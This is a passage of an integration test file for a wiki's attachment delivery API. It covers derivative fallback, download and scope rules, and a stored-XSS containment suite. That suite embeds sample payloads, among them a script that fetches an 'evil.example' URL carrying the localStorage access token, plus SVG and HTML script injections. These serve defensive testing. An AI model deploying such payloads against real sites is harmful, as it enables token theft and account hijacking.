          .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
        expect(upload.status).toBe(200);
        const id = upload.body.attachment._id;

        const Attachment = crowi.model('Attachment');
        const stored = await Attachment.findById(id);
        expect(stored?.derivatives?.display?.mode).toBe('resized');
        const derivativeFilePath = stored?.derivatives?.display?.filePath as string;

        const driver = crowi.getPlugins().active.storage;
        if (!driver) throw new Error('storage driver missing in test env');
        const derivativeStream = await driver.get(derivativeFilePath);
        const derivativeChunks: Buffer[] = [];
        for await (const chunk of derivativeStream) derivativeChunks.push(chunk as Buffer);
        const derivativeBytes = Buffer.concat(derivativeChunks);

        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

        expect(res.status).toBe(200);
        // A valid MIME string ('image/jpeg'), NOT the sharp decoder identifier ('jpeg') — §6/AC1.
        expect(res.headers['content-type']).toBe('image/jpeg');
        expect(res.headers['content-type']).not.toBe('jpeg');
        const received = res.body as Buffer;
        expect(received.equals(derivativeBytes)).toBe(true);
        // ...and genuinely NOT the original bytes — proves this actually served the resized derivative.
        expect(received.equals(wideJpeg)).toBe(false);
      });

      it('falls back to original when derivatives.display was evaluated but classified "failed" (decode-error) — the display branch is skipped entirely', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}display-fallback-failed`, '# ff');
        const garbage = Buffer.from('this is not a real png, just garbage bytes for the delivery test');
        const upload = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', garbage, { filename: 'not-a-png.png', contentType: 'image/png' });
        expect(upload.status).toBe(200);
        const id = upload.body.attachment._id;

        const Attachment = crowi.model('Attachment');
        const stored = await Attachment.findById(id);
        expect(stored?.derivatives?.display?.mode).toBe('failed');

        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

        expect(res.status).toBe(200);
        expect(res.headers['content-type']).toBe('image/png');
        const received = res.body as Buffer;
        expect(received.equals(garbage)).toBe(true);
      });

      it('falls back to original when derivatives.display.mode is "resized" but the derivative object is missing from storage — a cache miss, not a 500/placeholder (§9 step 4)', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}display-fallback-missing`, '# fm');
        const wideJpeg = await createWideJpeg();
        const upload = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
        expect(upload.status).toBe(200);
        const id = upload.body.attachment._id;

        const Attachment = crowi.model('Attachment');
        const stored = await Attachment.findById(id);
        expect(stored?.derivatives?.display?.mode).toBe('resized');
        const derivativeFilePath = stored?.derivatives?.display?.filePath as string;

        // Delete the derivative OBJECT directly through the driver while
        // leaving `derivatives.display` (mode: resized, filePath set)
        // untouched on the Attachment row — exactly the "metadata says
        // resized but the object is gone" cache-miss the fallback exists
        // for (spec §7 end / §9 step 4).
        const driver = crowi.getPlugins().active.storage;
        if (!driver) throw new Error('storage driver missing in test env');
        await driver.delete(derivativeFilePath);

        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

        expect(res.status).toBe(200);
        expect(res.headers['content-type']).toBe('image/jpeg');
        const received = res.body as Buffer;
        expect(received.equals(wideJpeg)).toBe(true);
      });

      it('falls back to original when the display derivative get() rejects with a NoSuchKey-shaped error (S3), not just local ENOENT', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}display-fallback-nosuchkey`, '# fn');
        const wideJpeg = await createWideJpeg();
        const upload = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
        expect(upload.status).toBe(200);
        const id = upload.body.attachment._id;

        const Attachment = crowi.model('Attachment');
        const stored = await Attachment.findById(id);
        expect(stored?.derivatives?.display?.mode).toBe('resized');
        const derivativeFilePath = stored?.derivatives?.display?.filePath as string;

        // Reject ONLY the derivative key so original delivery (the fallback
        // under test) still resolves through the REAL driver — `get` is
        // otherwise delegated to the original implementation.
        const driver = crowi.getPlugins().active.storage;
        if (!driver) throw new Error('storage driver missing in test env');
        const originalGet = driver.get.bind(driver);
        const getSpy = jest.spyOn(driver, 'get').mockImplementation((key: string) => {
          if (key === derivativeFilePath) {
            const err = Object.assign(new Error('The specified key does not exist.'), {
              name: 'NoSuchKey',
              $metadata: { httpStatusCode: 404 },
            });
            return Promise.reject(err);
          }
          return originalGet(key);
        });

        try {
          const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
          expect(res.status).toBe(200);
          expect(res.headers['content-type']).toBe('image/jpeg');
          const received = res.body as Buffer;
          expect(received.equals(wideJpeg)).toBe(true);
        } finally {
          getSpy.mockRestore();
        }
      });

      it('/attachments/:id itself still has no scope check — a pages:read-only OAuth token can access it (pre-existing gap, unchanged by this feature — spec §3)', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}no-scope-gap`, '# gap');
        const upload = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
        expect(upload.status).toBe(200);
        const id = upload.body.attachment._id;

        const scoped = await createTestUser({ name: 'Attach No Scope Gap', username: 'attachNoScopeGap', email: 'attach-no-scope-gap@example.com' });
        const oauthToken = createJwtUtil(crowi).signOauthAccessToken({ user: scoped.user, scopes: ['pages:read'], clientId: 'crowi-cli' });

        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(oauthToken));
        expect(res.status).toBe(200);
      });
    });
  });

  describe('GET /api/attachments/:id/original (raw stream, always original — feature-image-derivative-optimization Phase 2)', () => {
    it('returns 401 without auth', async () => {
      const res = await request(app).get('/api/attachments/000000000000000000000000/original');
      expect(res.status).toBe(401);
    });

    it('serves the file-not-found placeholder for a non-existent attachment record', async () => {
      const res = await request(app).get('/api/attachments/000000000000000000000000/original').set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('image/png');
      const received = res.body as Buffer;
      expect(received.equals(fileNotFoundImage)).toBe(true);
    });

    it('returns 404 (not the placeholder) when the caller lacks grant on the page', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-grant-fail`, '# secret', 4 /* GRANT_OWNER */);
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(otherAccessToken));
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
    });

    it('serves the placeholder when the backing original file is missing (local ENOENT)', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-enoent`, '# oe');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const Attachment = crowi.model('Attachment');
      const stored = await Attachment.findById(id);
      const driver = crowi.getPlugins().active.storage;
      if (!driver) throw new Error('storage driver missing in test env');
      await driver.delete(stored.filePath);

      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('image/png');
      const received = res.body as Buffer;
      expect(received.equals(fileNotFoundImage)).toBe(true);
    });

    it('always returns the ORIGINAL bytes, even when a "resized" display derivative exists — never reads derivatives.display/mode/reason', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-ignores-display`, '# oid');
      const wideJpeg = await createWideJpeg();
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const Attachment = crowi.model('Attachment');
      const stored = await Attachment.findById(id);
      expect(stored?.derivatives?.display?.mode).toBe('resized');

      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('image/jpeg');
      const received = res.body as Buffer;
      expect(received.equals(wideJpeg)).toBe(true);
    });

    it('Content-Disposition is inline with originalName, same as /attachments/:id', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-disposition`, '# od');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'my pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(accessToken));
      expect(res.status).toBe(200);
      expect(res.headers['content-disposition']).toBe(`inline; filename*=UTF-8''${encodeURIComponent('my pixel.png')}`);
    });

    it('403 INSUFFICIENT_SCOPE for a pages:read-only OAuth token (requires attachments:read explicitly, §3)', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-scope-insufficient`, '# scope');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const scoped = await createTestUser({ name: 'Attach Scope Read', username: 'attachOriginalScopeRead', email: 'attach-original-scope-read@example.com' });
      const oauthToken = createJwtUtil(crowi).signOauthAccessToken({ user: scoped.user, scopes: ['pages:read'], clientId: 'crowi-cli' });

      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(oauthToken));
      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('INSUFFICIENT_SCOPE');
    });

    it('200 for an attachments:read-scoped OAuth token', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-scope-sufficient`, '# scope-ok');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const scoped = await createTestUser({ name: 'Attach Scope Ok', username: 'attachOriginalScopeOk', email: 'attach-original-scope-ok@example.com' });
      const oauthToken = createJwtUtil(crowi).signOauthAccessToken({ user: scoped.user, scopes: ['attachments:read'], clientId: 'crowi-cli' });

      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(oauthToken)).buffer(true).parse(bufferParser);
      expect(res.status).toBe(200);
      expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
    });

    it('200 for a web-session token (ALL_SCOPES) — unaffected by the new scope requirement', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-scope-web`, '# scope-web');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
      expect(res.status).toBe(200);
      expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
    });
  });

  /**
   * The strict delivery route. `/attachments/:id` and `/original` answer a
   * missing record or a missing stored object with `200 image/png` — the
   * `file-not-found.png` placeholder — so an embedded `<img>` degrades
   * gracefully. A client extracting bytes cannot tell that apart from a real
   * file, so this route never substitutes it: every assertion below about a
   * 404 is really "the caller cannot be handed the placeholder by mistake".
   */
  describe('GET /api/attachments/:id/download (raw stream, strict — never the placeholder)', () => {
    /** Upload `pngBuffer` to a fresh page and return the attachment id. */
    const seedAttachment = async (slug: string, filename = 'pixel.png', grant?: number): Promise<string> => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}${slug}`, '# dl', grant);
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename, contentType: 'image/png' });
      expect(upload.status).toBe(200);
      return upload.body.attachment._id;
    };

    it('returns 401 without auth', async () => {
      const res = await request(app).get('/api/attachments/000000000000000000000000/download');
      expect(res.status).toBe(401);
    });

    it('404 ATTACHMENT_NOT_FOUND — not the placeholder — for a non-existent record', async () => {
      const res = await request(app).get('/api/attachments/000000000000000000000000/download').set(authHeaders(accessToken));

      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
    });

    it('404 ATTACHMENT_NOT_FOUND when the caller lacks grant on the page', async () => {
      const id = await seedAttachment('download-grant-fail', 'pixel.png', 4 /* GRANT_OWNER */);

      const res = await request(app).get(`/api/attachments/${id}/download`).set(authHeaders(otherAccessToken));
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
    });

    it('404 FILE_MISSING — not the placeholder — when the record exists but the stored file is gone', async () => {
      const id = await seedAttachment('download-enoent');
      const Attachment = crowi.model('Attachment');
      const stored = await Attachment.findById(id);
      const driver = crowi.getPlugins().active.storage;
      if (!driver) throw new Error('storage driver missing in test env');
      await driver.delete(stored.filePath);

      const res = await request(app).get(`/api/attachments/${id}/download`).set(authHeaders(accessToken));

      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('FILE_MISSING');
    });

    it('serves the bytes as application/octet-stream with an attachment disposition, even for an image', async () => {
      const id = await seedAttachment('download-octet-stream');

      const res = await request(app).get(`/api/attachments/${id}/download`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      // Never the stored MIME: this route hands over bytes, so it can never
      // be the one that serves a stored file inline.
      expect(res.headers['content-type']).toBe('application/octet-stream');
      expect(res.headers['content-disposition']).toBe(`attachment; filename*=UTF-8''pixel.png`);
      expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
    });

    it('declares Content-Length from the recorded fileSize, so a cut-short delivery is detectable', async () => {
      // Without this header the node adapter fills in `content-length: 0`
      // when its preread collects nothing — which is what a read error
      // looks like — and the caller receives a well-formed empty 200 that
      // is indistinguishable from a genuinely empty file.
      const id = await seedAttachment('download-content-length');

      const res = await request(app).get(`/api/attachments/${id}/download`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-length']).toBe(String(pngBuffer.length));
      expect((res.body as Buffer).length).toBe(pngBuffer.length);
    });

    it('omits Content-Length for a legacy row whose fileSize was never recorded', async () => {
      const id = await seedAttachment('download-legacy-no-size');
      const Attachment = crowi.model('Attachment');
      await Attachment.updateOne({ _id: id }, { $set: { fileSize: 0 } });

      const res = await request(app).get(`/api/attachments/${id}/download`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      // A declared 0 would make the real bytes look like an overrun.
      expect(res.headers['content-length']).not.toBe('0');
      expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
    });

    it('percent-escapes the characters RFC 8187 reserves in the filename', async () => {
      const id = await seedAttachment('download-filename-escaping', "it's (1).png");

      const res = await request(app).get(`/api/attachments/${id}/download`).set(authHeaders(accessToken));

      expect(res.status).toBe(200);
      // `encodeURIComponent` leaves ' ( ) * alone; RFC 8187's `attr-char`
      // does not include them, so they must be escaped on top of it.
      expect(res.headers['content-disposition']).toBe(`attachment; filename*=UTF-8''it%27s%20%281%29.png`);
    });

    it('serves the ORIGINAL bytes even when a resized display derivative exists', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}download-ignores-display`, '# did');
      const wideJpeg = await createWideJpeg();
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;
      const Attachment = crowi.model('Attachment');
      expect((await Attachment.findById(id))?.derivatives?.display?.mode).toBe('resized');

      const res = await request(app).get(`/api/attachments/${id}/download`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect((res.body as Buffer).equals(wideJpeg)).toBe(true);
    });

    it('403 INSUFFICIENT_SCOPE for a pages:read-only OAuth token', async () => {
      const id = await seedAttachment('download-scope-insufficient');
      const scoped = await createTestUser({
        name: 'Attach DL Scope Read',
        username: 'attachDownloadScopeRead',
        email: 'attach-download-scope-read@example.com',
      });
      const oauthToken = createJwtUtil(crowi).signOauthAccessToken({ user: scoped.user, scopes: ['pages:read'], clientId: 'crowi-cli' });

      const res = await request(app).get(`/api/attachments/${id}/download`).set(authHeaders(oauthToken));
      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('INSUFFICIENT_SCOPE');
    });

    it('200 for an attachments:read-scoped OAuth token — the scope the CLI asks for', async () => {
      const id = await seedAttachment('download-scope-sufficient');
      const scoped = await createTestUser({ name: 'Attach DL Scope Ok', username: 'attachDownloadScopeOk', email: 'attach-download-scope-ok@example.com' });
      const oauthToken = createJwtUtil(crowi).signOauthAccessToken({ user: scoped.user, scopes: ['attachments:read'], clientId: 'crowi-cli' });

      const res = await request(app).get(`/api/attachments/${id}/download`).set(authHeaders(oauthToken)).buffer(true).parse(bufferParser);
      expect(res.status).toBe(200);
      expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
    });

    it('401 for a cookie-only request — the cookie fallback covers the `<img>` delivery routes, not this one', async () => {
      const id = await seedAttachment('download-cookie-rejected');

      const res = await request(app).get(`/api/attachments/${id}/download`).set(cookieHeaders(accessToken));
      expect(res.status).toBe(401);
    });
  });

  describe('GET /api/attachments/by-key/:key (raw stream)', () => {
    const tmpFiles: string[] = [];

    afterEach(() => {
      // Best-effort cleanup of files we wrote into the storage-local rootDir.
      for (const p of tmpFiles.splice(0)) {
        try {
          fs.unlinkSync(p);
        } catch {
          /* ignore */
        }
      }
    });

    /**
     * The local storage driver writes to `<rootDir>/<key>` where `rootDir`
     * defaults to `data/uploads` relative to cwd. We seed a profile-style
     * file directly through the driver so the test does not need to wire a
     * full upload flow.
     */
    const seedKey = async (key: string, contents: Buffer) => {
      const driver = crowi.getPlugins().active.storage;
      if (!driver) throw new Error('storage driver missing in test env');
      await driver.put(key, contents, { contentType: 'image/png' });
      // Track for cleanup if running against real filesystem (storage-local).
      const candidate = path.resolve(process.cwd(), 'data/uploads', key);
      tmpFiles.push(candidate);
    };

    it('returns 401 without auth', async () => {
      const res = await request(app).get('/api/attachments/by-key/user/anything.png');
      expect(res.status).toBe(401);
    });

    it('returns 403 for keys outside the user/ prefix (e.g. attachment/...)', async () => {
      const res = await request(app).get('/api/attachments/by-key/attachment/abc/foo.png').set(authHeaders(accessToken));
      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('FORBIDDEN_FOR_DELETE');
    });

    it('streams a profile picture for the user/ prefix', async () => {
      const userKey = `user/${userId}-test-${Date.now()}.png`;
      await seedKey(userKey, pngBuffer);

      const res = await request(app)
        .get(`/api/attachments/by-key/${encodeURIComponent(userKey)}`)
        .set(authHeaders(accessToken))
        .buffer(true)
        .parse((response, callback) => {
          const chunks: Buffer[] = [];
          response.on('data', (chunk: Buffer) => chunks.push(chunk));
          response.on('end', () => callback(null, Buffer.concat(chunks)));
          response.on('error', (err) => callback(err, Buffer.alloc(0)));
        });

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('image/png');
      const received = res.body as Buffer;
      expect(Buffer.isBuffer(received)).toBe(true);
      expect(received.equals(pngBuffer)).toBe(true);
    });

    it('returns 404 when the key does not exist', async () => {
      const res = await request(app)
        .get(`/api/attachments/by-key/${encodeURIComponent('user/missing-' + Date.now() + '.png')}`)
        .set(authHeaders(accessToken));
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
    });
  });

  // RFC-0006 Phase 6 Sub-batch D restored this v1 `/files/<id>` compat
  // redirect on Hono (attachment-stream.ts). feature-api-v2-path-removal
  // Phase 3 flipped its target from `/api/v2/attachments/:id` to
  // `/api/attachments/:id`; this covers that redirect target directly.
  describe('GET /files/:id (legacy v1 compat redirect)', () => {
    it('redirects to /api/attachments/:id without requiring auth', async () => {
      const id = '000000000000000000000000';
      const res = await request(app).get(`/files/${id}`);
      expect(res.status).toBe(302);
      expect(res.headers.location).toBe(`/api/attachments/${id}`);
    });

    it('does not match a non-24-hex id', async () => {
      const res = await request(app).get('/files/not-an-object-id');
      expect(res.status).toBe(404);
    });
  });

  describe('attachment delivery — stored-XSS containment', () => {
    // The general page-attachment upload path records the multipart client's
    // SELF-DECLARED `file.type` as `fileFormat` with no allowlist (the MIME
    // allowlist only covers the editor paste/dnd intents), and delivery used to
    // echo that value straight back as `Content-Type` with
    // `Content-Disposition: inline`. On the recommended same-origin topology
    // (web rewrites `/api/*` to the api) that let any user with edit rights
    // execute HTML on the wiki's own origin and read the JWT out of
    // localStorage. Containment therefore has to live on the DELIVERY side, so
    // that attachments already stored with a hostile `fileFormat` are covered
    // too — validating only future uploads would leave them exploitable.

    /** Upload `body` to a fresh page under `slug` declaring `contentType`, return the attachment id. */
    const uploadDeclaring = async (slug: string, body: Buffer, filename: string, contentType: string): Promise<string> => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}${slug}`, '# x');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', body, { filename, contentType });
      expect(upload.status).toBe(200);
      return upload.body.attachment._id as string;
    };

    it('does not serve a text/html attachment inline as text/html', async () => {
      const html = Buffer.from('<script>fetch("https://evil.example/?t="+localStorage.getItem("crowi:accessToken"))</script>');
      const id = await uploadDeclaring(`xss-html-${Date.now()}`, html, 'payload.html', 'text/html');

      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('application/octet-stream');
      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
      expect(res.headers['x-content-type-options']).toBe('nosniff');
    });

    it('does not 500 on a corrupt non-string fileFormat (falls through to the safe branch)', async () => {
      // `fileFormat` is persisted data — a raw Mongo import or an old migration
      // can leave a non-string there, and the delivery policy must degrade
      // rather than throw (a 500 here would also be the one response shape that
      // most easily escapes the header middleware).
      const id = await uploadDeclaring(`xss-corrupt-${Date.now()}`, pngBuffer, 'pixel.png', 'image/png');
      const Attachment = crowi.model('Attachment');
      await Attachment.collection.updateOne({ _id: new Types.ObjectId(id) }, { $set: { fileFormat: 12345 } });

      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('application/octet-stream');
      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
    });

    // NOTE on scope: these assert the HTTP contract this handler controls — the
    // headers it emits. They do NOT execute the response in a browser, so the
    // downstream claim that a bare `sandbox` actually denies script and origin
    // access to an SVG loaded via `<object>`/`<embed>`/`<iframe>`/navigation is
    // NOT verified here. Proving that needs same-origin browser coverage in
    // `packages/e2e`, which is currently blocked on the dev-server distDir
    // isolation work; treat this as a known coverage gap, not as proven.
    it('sandboxes an SVG attachment instead of stripping its type (keeps <img> embeds working)', async () => {
      // `image/svg+xml` is allowlisted even on the VALIDATED editor paste path
      // (`UPLOAD_ALLOWED_MIME`), and uploaded SVG is never run through
      // `@crowi/svg-sanitize` — so an SVG IS a scriptable document here.
      // `Content-Disposition: attachment` alone would NOT contain it: the
      // renderer keeps raw `<object>`/`<embed>` (`known-tags.ts`), which load
      // an SVG into a real browsing context, and whether they honour
      // `Content-Disposition` is browser behaviour (cf. Firefox CVE-2025-6430)
      // rather than a guarantee. The bare `sandbox` CSP is the containment:
      // any document made from this response is scriptless and origin-opaque,
      // so there is no wiki origin left to read localStorage from. The type
      // survives because CSP is ignored on subresource loads, which is exactly
      // how uploaded SVGs are used (`<img src=...>` in a page body).
      const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>');
      const id = await uploadDeclaring(`xss-svg-${Date.now()}`, svg, 'payload.svg', 'image/svg+xml');

      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('image/svg+xml');
      expect(res.headers['content-security-policy']).toBe('sandbox');
      expect(res.headers['x-content-type-options']).toBe('nosniff');
    });

    it('never sandboxes the download branch (a sandbox without allow-downloads blocks the download itself)', async () => {
      const id = await uploadDeclaring(`xss-dl-${Date.now()}`, Buffer.from('PKzip'), 'a.zip', 'application/zip');

      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.headers['content-type']).toBe('application/octet-stream');
      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
      expect(res.headers['content-security-policy']).toBeUndefined();
    });

    // feature-attachment-upload-policy AC: ".docx / .xlsx がアップロードでき、直接
    // 開くとダウンロードになる" — `INLINE_SAFE_MIME` is untouched by this feature
    // (out of scope), so office documents fall through to the same download
    // branch as any other non-allowlisted type, same as the `.zip` case above.
    it('delivers a .docx attachment as a download, not inline (INLINE_SAFE_MIME is unchanged by this feature)', async () => {
      const id = await uploadDeclaring(
        `docx-dl-${Date.now()}`,
        Buffer.from('PK stub docx bytes'),
        'report.docx',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      );

      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('application/octet-stream');
      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
    });

    it('delivers a .xlsx attachment as a download, not inline', async () => {
      const id = await uploadDeclaring(
        `xlsx-dl-${Date.now()}`,
        Buffer.from('PK stub xlsx bytes'),
        'sheet.xlsx',
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      );

      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('application/octet-stream');
      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
    });

    it('cannot be pushed back onto the inline branch by decorating the declared type', async () => {
      // The allowlist is matched on the bare, lowercased type, so parameters,
      // casing and surrounding whitespace cannot smuggle `text/html` past it.
      for (const [i, declared] of ['text/html; charset=utf-8', 'TEXT/HTML', ' text/html '].entries()) {
        const id = await uploadDeclaring(`xss-variant-${i}-${Date.now()}`, Buffer.from('<script>alert(1)</script>'), 'p.html', 'image/png');
        const Attachment = crowi.model('Attachment');
        await Attachment.updateOne({ _id: id }, { $set: { fileFormat: declared } });

        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

        expect(res.headers['content-type']).toBe('application/octet-stream');
        expect(res.headers['content-disposition']).toMatch(/^attachment;/);
      }
    });

    it('still serves a genuine image inline, with nosniff', async () => {
      const id = await uploadDeclaring(`xss-png-${Date.now()}`, pngBuffer, 'pixel.png', 'image/png');

      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('image/png');
      expect(res.headers['content-disposition']).toMatch(/^inline;/);
      expect(res.headers['x-content-type-options']).toBe('nosniff');
      expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
    });

    it('sets nosniff on a CORS preflight too (the header middleware has to run outside CORS, which answers OPTIONS without calling next())', async () => {
      const res = await request(app).options('/api/attachments/000000000000000000000000').set('Origin', 'http://localhost:3000');

      expect(res.headers['x-content-type-options']).toBe('nosniff');
    });

    it('contains an attachment already stored with a hostile fileFormat (retroactive, not upload-time-only)', async () => {
      // Upload as a legitimate PNG, then rewrite `fileFormat` directly to
      // stand in for a row created before delivery-side containment existed.
      const id = await uploadDeclaring(`xss-legacy-${Date.now()}`, pngBuffer, 'pixel.png', 'image/png');
      const Attachment = crowi.model('Attachment');
      await Attachment.updateOne({ _id: id }, { $set: { fileFormat: 'text/html' } });

      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('application/octet-stream');
      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
    });

    it('applies the same containment on /original', async () => {
      const html = Buffer.from('<script>alert(1)</script>');
      const id = await uploadDeclaring(`xss-orig-${Date.now()}`, html, 'payload.html', 'text/html');

      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('application/octet-stream');
      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
    });
  });

  describe('GET /api/attachments/:id/meta (single attachment metadata)', () => {
    /** Upload a PNG to a page and return its attachment id. */
    const uploadTo = async (pageId: string) => {
      const res = await request(app)
        .post(`/api/pages/${pageId}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(res.status).toBe(200);
      return res.body.attachment._id as string;
    };

    it('returns 401 without auth', async () => {
      const res = await request(app).get('/api/attachments/000000000000000000000000/meta');
